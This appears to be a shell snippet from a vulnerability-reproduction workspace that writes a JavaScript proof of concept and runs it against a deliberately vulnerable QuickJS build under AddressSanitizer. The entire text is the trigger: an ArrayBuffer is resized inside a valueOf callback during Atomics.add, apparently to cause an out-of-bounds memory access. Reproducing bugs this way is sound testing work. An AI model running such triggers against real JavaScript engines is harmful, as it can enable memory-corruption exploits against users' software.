cat > /workspace/poc1.js <<'EOF'
let ab = new ArrayBuffer(4, { maxByteLength: 0x1000000 });
let ta = new Uint32Array(ab);
let v = { valueOf() { ab.resize(0x1000000); return 1; } };
Atomics.add(ta, 0, v);
EOF



cd /workspace/repo-vul/src-vul && ASAN_OPTIONS=detect_leaks=0 ./qjs /workspace/poc1.js; echo rc:$?
